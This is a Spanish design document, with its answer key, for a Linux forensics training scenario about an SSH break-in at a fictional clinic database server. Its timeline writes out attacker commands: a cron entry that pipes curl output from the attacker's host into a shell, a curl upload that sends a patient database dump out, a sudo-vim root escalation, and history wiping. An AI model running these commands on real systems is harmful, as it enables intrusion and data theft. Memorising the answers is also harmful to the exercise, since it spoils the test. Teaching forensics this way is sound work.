---
tags:
  - DFIR/Simulacion
  - DFIR/Linux
estado: borrador fase 1
---

# Diseño — Escenario 02: compromiso de `db01` por SSH

Documento de trabajo. Contiene las respuestas, así que no es material para quien vaya a resolver el caso. Gobierna el generador: todo lo que aparezca en las evidencias tiene que salir de esta línea temporal, y nada que no esté aquí debería aparecer.

## Premisa

Una semana después de la intrusión en el portal (escenario 01), IT rotó las contraseñas del panel pero **no la de la base de datos**. En `db01` existe además una cuenta de sistema `portal_app`, creada por la DBA para los scripts de despliegue, **con la misma contraseña** que el usuario de MariaDB. El cortafuegos del proveedor reenvía `TCP/2222` público hacia `db01:22` para que la DBA pueda hacer mantenimiento remoto. El atacante, que ya tenía la credencial y la lista de usuarios de `web01`, vuelve por ahí.

El caso se resuelve solo con sus evidencias. La relación con el 01 es una pregunta de contexto, no un requisito.

## Activos

| Activo | IP | Rol |
| --- | --- | --- |
| `db01.kelbrook.internal` | `10.20.30.20` | Ubuntu 22.04, MariaDB 10.6, OpenSSH 8.9. Víctima |
| `web01` | `10.20.30.10` | Portal web. Cliente MySQL constante contra `db01` (ruido) |
| `nas01` | `10.20.30.40` | NAS de copias. Recibe el backup nocturno por rsync/SSH (ruido) |
| `ws-it-02` | `10.20.30.55` | Puesto de la DBA. Login legítimo por SSH (ruido) |
| `dns01` | `10.20.30.2` | Resolvedor interno |
| `fw01` | `10.20.30.1` | Cortafuegos/puerta de enlace. NAT `2222 → 10.20.30.20:22` |
| Atacante | `198.51.100.212` | VPS distinto al del escenario 01 (`198.51.100.37`). Sirve HTTP en `8080` |
| Escáner | `203.0.113.77` | Fuerza bruta de fondo de internet contra el 2222. **No** es el atacante |

Cuentas en `db01` antes del incidente:

| Usuario | UID | Notas |
| --- | --- | --- |
| `root` | 0 | Sin clave SSH autorizada. `PermitRootLogin prohibit-password` |
| `mvega` | 1001 | Marta Vega, DBA. Grupo `sudo`. Login por clave desde `ws-it-02` |
| `portal_app` | 1002 | Cuenta de despliegue. Contraseña `Kb!portal#2024` (reutilizada de MariaDB) |
| `backup` | 1003 | Ejecuta `/usr/local/bin/db-backup.sh` por cron a las 23:00. Sin shell interactiva |

Configuración relevante:

- `/etc/sudoers.d/portal_app`: `portal_app ALL=(root) NOPASSWD: /usr/bin/vim /etc/mysql/mariadb.conf.d/*`. Lo dejó la DBA para que el despliegue pudiera ajustar la configuración sin pedirle a ella. Es la vía de escalada.
- `/etc/profile.d/history.sh`: `HISTTIMEFORMAT="%F %T "`, `HISTSIZE=5000`, `shopt -s histappend`. Buena práctica de la DBA que hace que `.bash_history` lleve marcas de tiempo.
- Sin fail2ban. El escáner acumula cientos de fallos sin bloqueo (hallazgo de remediación).
- Bases de datos: `kb_portal` (la del portal) y `kb_clinica` (historias clínicas, `pacientes` con 1 240 filas, `citas`, `historias`).

## Línea temporal

Todas las horas en UTC. Ventana de la captura: **2026-09-29 22:00 → 2026-09-30 03:00**. El triage del host se recoge el 30 a las 08:30.

### Ruido legítimo

| Hora | Evento | Dónde se ve |
| --- | --- | --- |
| 22:00 – 03:00 | `web01` consulta MariaDB en `db01:3306` de forma continua, varias conexiones por minuto | PCAP |
| 22:00 – 03:00 | Consultas DNS de `db01` a `dns01` (NTP, apt, `nas01`) y NTP a `203.0.113.5` | PCAP |
| 22:03:12 – 22:17:48 | `mvega` entra por SSH con clave desde `ws-it-02`, revisa estado de MariaDB y espacio en disco, sale | `auth.log` (publickey), `wtmp`, `.bash_history` de `mvega` |
| 23:00:01 – 23:04:30 | Cron de `backup`: `mysqldump` a `/var/backups/mariadb/` y `rsync` por SSH a `nas01` | `syslog` (CRON), `auth.log` (sesión de cron), PCAP (SSH saliente a `10.20.30.40:22`, ~9 MB) |
| 23:41 – 00:36 | Escáner `203.0.113.77`: ~190 intentos fallidos contra `root`, `admin`, `ubuntu`, `pi`, `test`, `oracle`, `postgres`. Cadencia regular, un intento cada 15-20 s, UA SSH `libssh2` | `auth.log`, `btmp`, PCAP |

### Intrusión

| Hora | Evento | Dónde se ve |
| --- | --- | --- |
| 01:02:10 – 01:02:51 | Desde `198.51.100.212`, cinco fallos de contraseña: `root` (x2), `nhollis`, `deploy`, `admin`. `nhollis` y `deploy` existían en `web01`, no en `db01`: `auth.log` los marca como `Invalid user` | `auth.log`, `btmp` |
| 01:03:05 | `Accepted password for portal_app from 198.51.100.212 port 51734 ssh2`. Sesión `pts/1` | `auth.log`, `wtmp`, `lastlog` |
| 01:03 – 01:09 | Reconocimiento: `id`, `hostname`, `uname -a`, `cat /etc/passwd`, `sudo -l`, `ss -tlnp`, `ps aux`, `ls /etc/mysql/mariadb.conf.d/`, `cat /etc/os-release` | Se escribe en el historial de `portal_app` pero **se borra después** (ver antiforense). Sobrevive el `sudo -l` en `auth.log` |
| 01:10:18 | `sudo /usr/bin/vim /etc/mysql/mariadb.conf.d/50-server.cnf` y escape a shell desde el editor. A partir de aquí todo corre como `root` en una shell hija de vim | `auth.log` (línea `sudo: portal_app : TTY=pts/1 ; PWD=/home/portal_app ; USER=root ; COMMAND=/usr/bin/vim ...`), `/root/.bash_history` empieza a 01:10:31 |
| 01:11 – 01:14 | Como root: `id`, `cat /etc/shadow`, `mysql -e 'SHOW DATABASES'`, `mysql -e 'SELECT COUNT(*) FROM kb_clinica.pacientes'` | `/root/.bash_history` |
| 01:15:02 | `useradd -m -s /bin/bash -G sudo support`; `passwd support` | `auth.log` (`useradd`, `usermod`/`gpasswd` añadiendo a `sudo`, `passwd` cambiada), `/etc/passwd` (UID 1004), `/etc/shadow`, `/etc/group`, `/home/support/` |
| 01:16:20 | `mkdir -p /root/.ssh` y `echo 'ssh-ed25519 AAAA... ops@kelbrook-backup' >> /root/.ssh/authorized_keys` | `/root/.bash_history`, el fichero en el triage con mtime 01:16 |
| 01:17:40 | `/etc/cron.d/mariadb-health` con `*/10 * * * * root curl -s http://198.51.100.212:8080/c/$(hostname) \| sh` | `/root/.bash_history`, el fichero, `syslog` (`cron[...]: (*system*mariadb-health) RELOAD`) |
| 01:20:01 en adelante | Primer disparo del cron y sucesivos cada 10 minutos hasta el fin de la captura: `GET /c/db01`, respuesta 200 vacía | `syslog` (CRON), PCAP (HTTP en claro, UA `curl/7.81.0`) |
| 01:20:40 – 01:23:10 | `mkdir /var/tmp/.font-cache`, `mysqldump kb_clinica > /var/tmp/.font-cache/kb_clinica.sql`, `tar czf /var/tmp/.font-cache/kb_clinica.tgz -C /var/tmp/.font-cache kb_clinica.sql` | `/root/.bash_history` |
| 01:24:05 | `curl -F 'f=@/var/tmp/.font-cache/kb_clinica.tgz' http://198.51.100.212:8080/up` | PCAP: `POST /up` multipart, `Content-Length` del orden de 60-80 KB, nombre del fichero en `Content-Disposition`. El `.tgz` se puede extraer de la captura y contar los `INSERT` |
| 01:25:30 | `rm -rf /var/tmp/.font-cache` | `/root/.bash_history`. El directorio no está en el triage |
| 01:26:12 | `exit` de la shell root. Vim se cierra sin guardar cambios | `/root/.bash_history` termina aquí; `50-server.cnf` conserva su mtime antiguo |
| 01:26:40 | En la shell de `portal_app`: `history -c` y `exit` | El `.bash_history` de `portal_app` no contiene nada de esta noche (último bloque: despliegue del 18 de septiembre). Contraste con `auth.log` y `wtmp` |
| 01:27:03 | Cierre de sesión. Duración 23 min 58 s | `auth.log` (`session closed`, `Disconnected`), `wtmp` |
| 02:05:17 – 02:07:02 | `Accepted publickey for root from 198.51.100.212 port 51902 ssh2: ED25519 SHA256:...`. Comprueba `crontab`, `id`, sale | `auth.log`, `wtmp`, `/root/.bash_history` (segundo bloque) |

### Qué pasa después (fuera de las evidencias)

El cron sigue llamando cada 10 minutos. Ningún otro acceso antes del triage. Lo deja abierto para un posible escenario 03.

## Mapa ATT&CK

| Fase | Técnica | Evidencia que la sostiene |
| --- | --- | --- |
| Acceso inicial | T1078.003 Valid Accounts: Local Accounts | `Accepted password for portal_app` |
| Acceso inicial | T1110.001 Brute Force: Password Guessing (ruido del escáner y los 5 fallos del atacante) | `btmp`, `auth.log` |
| Descubrimiento | T1033, T1082, T1087.001, T1049 | `sudo -l` en `auth.log`; historial de root |
| Escalada | T1548.003 Abuse Elevation Control Mechanism: Sudo | Línea `sudo ... COMMAND=/usr/bin/vim`, `/etc/sudoers.d/portal_app` |
| Credenciales | T1003.008 /etc/passwd and /etc/shadow | Historial de root |
| Persistencia | T1136.001 Create Account: Local Account | `useradd` en `auth.log`, `/etc/passwd` |
| Persistencia | T1098.004 Account Manipulation: SSH Authorized Keys | `/root/.ssh/authorized_keys`, login `publickey` a las 02:05 |
| Persistencia / C2 | T1053.003 Scheduled Task: Cron | `/etc/cron.d/mariadb-health`, `syslog`, PCAP |
| Recolección | T1005, T1560.001 Archive via Utility | Historial de root |
| Exfiltración | T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol | `POST /up` en el PCAP |
| Evasión | T1070.003 Clear Command History, T1070.004 File Deletion | `.bash_history` vacío de `portal_app`; `rm -rf` del staging |

## Evidencias que se entregan

```
02_Linux_SSH_Compromise/
├── Escenario.md
├── Solucion.md
├── generar_escenario.py
├── captura/
│   └── vlan-datos-2026-09-29.pcap
└── triage/
    └── db01-triage-2026-09-30.tar.gz
```

Contenido del tar de triage, con mtimes reales de la línea temporal:

```
var/log/auth.log        var/log/syslog        var/log/wtmp
var/log/btmp            var/log/lastlog
etc/passwd  etc/shadow  etc/group  etc/sudoers  etc/sudoers.d/portal_app
etc/crontab  etc/cron.d/  var/spool/cron/crontabs/
etc/ssh/sshd_config  etc/profile.d/history.sh  etc/os-release  etc/hostname
root/.bash_history  root/.ssh/authorized_keys
home/mvega/.bash_history  home/portal_app/.bash_history  home/support/
usr/local/bin/db-backup.sh
```

Lo que **no** se entrega, a propósito: imagen de disco, journal binario, el contenido de `/var/backups`. El escenario es de triage rápido, no de imagen completa.

## Trampas pensadas

1. **El escáner.** `203.0.113.77` tiene cuarenta veces más fallos que el atacante. Quien filtre por "la IP con más fallos" se equivoca de hilo. Se distingue por cadencia (metronómica frente a humana), por los usuarios probados (genéricos frente a nombres de la organización) y porque nunca consigue un `Accepted`.
2. **La IP cambia respecto al 01.** No se puede unir por IP. Se une por la cuenta `portal_app` y por los usuarios `nhollis` y `deploy`, que solo tienen sentido si el atacante leyó el `/etc/passwd` de `web01`.
3. **Historial borrado pero no del todo.** `portal_app` no deja rastro en su `.bash_history`; root sí, porque la shell escapada de vim es otro proceso con otro historial.
4. **Tráfico saliente legítimo.** El rsync a `nas01` mueve mucho más volumen que la exfiltración. El tamaño no es señal; el destino, sí.
5. **`50-server.cnf` intacto.** El `sudo vim` no modificó el fichero. Quien busque cambios en la configuración de MariaDB no encontrará nada: el editor fue el vehículo, no el objetivo.

## Preguntas (borrador, 16)

Se copian a `Escenario.md`. Respuesta esperada entre paréntesis, solo aquí.

1. ¿Qué usuario, desde qué IP y a qué hora consiguió el atacante su primer acceso interactivo a `db01`? (`portal_app`, `198.51.100.212`, 01:03:05)
2. Antes de entrar, probó otros cuatro nombres de usuario. ¿Cuáles, y cuáles de ellos no existían en `db01`? (`root`, `nhollis`, `deploy`, `admin`; no existen `nhollis`, `deploy`, `admin`)
3. Otra IP acumula muchos más fallos de autenticación. ¿Cuál es, cuántos intentos hizo y por qué no es el atacante? (`203.0.113.77`, ~190, nunca entra y prueba usuarios genéricos con cadencia automática)
4. ¿Qué relación tiene este acceso con el incidente del 23 de septiembre en `web01`? (credencial `portal_app` reutilizada; usuarios de `web01` probados)
5. ¿Cómo pasó el atacante de `portal_app` a `root`? Cita la línea exacta de `auth.log`. (`sudo ... COMMAND=/usr/bin/vim /etc/mysql/mariadb.conf.d/50-server.cnf` a las 01:10:18 y escape a shell)
6. ¿Qué configuración lo hizo posible y en qué fichero está? (`/etc/sudoers.d/portal_app`, vim sin contraseña sobre esa ruta)
7. ¿Qué cuenta nueva se creó, con qué UID, en qué grupo y a qué hora? (`support`, 1004, `sudo`, 01:15:02)
8. ¿Qué clave SSH se añadió, a qué cuenta, y cuál es su comentario? (ed25519 en `/root/.ssh/authorized_keys`, comentario `ops@kelbrook-backup`)
9. ¿Qué mecanismo de ejecución periódica dejó, cada cuánto se dispara y a dónde conecta? (`/etc/cron.d/mariadb-health`, cada 10 min, `http://198.51.100.212:8080/c/db01`)
10. ¿A qué hora se ejecutó por primera vez ese mecanismo y cuántas veces aparece en la captura? (01:20:01, 11 veces hasta las 03:00)
11. ¿Qué datos se sacaron de `db01`, por qué protocolo, hacia dónde y cuánto ocupaba el fichero? (`kb_clinica.tgz`, HTTP POST en claro a `198.51.100.212:8080/up`, tamaño exacto del `Content-Length`)
12. ¿Cuántos pacientes contiene el volcado exfiltrado? (1 240, extrayendo el `.tgz` del PCAP)
13. ¿Dónde preparó el atacante los ficheros antes de sacarlos y qué hizo con ese directorio? (`/var/tmp/.font-cache`, `rm -rf`)
14. El historial de `portal_app` no muestra nada de esa noche. ¿Por qué, y qué otras fuentes reconstruyen lo que hizo? (`history -c`; `auth.log`, `wtmp`, `/root/.bash_history`)
15. ¿Cuánto duró la sesión inicial del atacante y cuándo volvió? ¿Con qué método se autenticó la segunda vez? (23 min 58 s; 02:05:17, `publickey` como `root`)
16. En la captura hay una transferencia SSH saliente de `db01` mucho mayor que la exfiltración. ¿Qué es y cómo se descarta? (backup rsync a `nas01` a las 23:00, programado en cron, mismo volumen cada noche)

Entregable sugerido: línea temporal, IOCs (IP, clave pública, ruta del cron, cuenta `support`), lista de persistencias a eliminar y tres recomendaciones.

## Decisiones abiertas para revisar antes de la fase 2

- **Formato de los logs binarios.** `wtmp`, `btmp` y `lastlog` se generan con el `struct utmp` de glibc x86_64 (384 bytes). Se leen con `last -f`, `lastb -f` y `lastlog`... `lastlog` no acepta `-f` en todas las versiones; se documentará `utmpdump` como alternativa.
- **`/etc/shadow`.** Hashes `$6$` generados con contraseñas inventadas. No hace falta que se crackeen; la de `support` se elige para que sí salga con una lista corta, por si alguien quiere intentarlo.
- **Exfiltración en claro.** Es deliberado para que el `.tgz` sea recuperable del PCAP. Un escenario posterior puede hacerla por TLS y obligar a trabajar solo con metadatos.
- **Tamaño del PCAP.** El ruido de MySQL y el rsync de 9 MB se simulan con payload aleatorio truncado (snaplen) para no pasar de 3-4 MB de fichero.
- **Dificultad.** Media. Si en la validación resulta fácil, se puede quitar la pista de "cuatro nombres" en la pregunta 2 y la de "mucho mayor" en la 16.
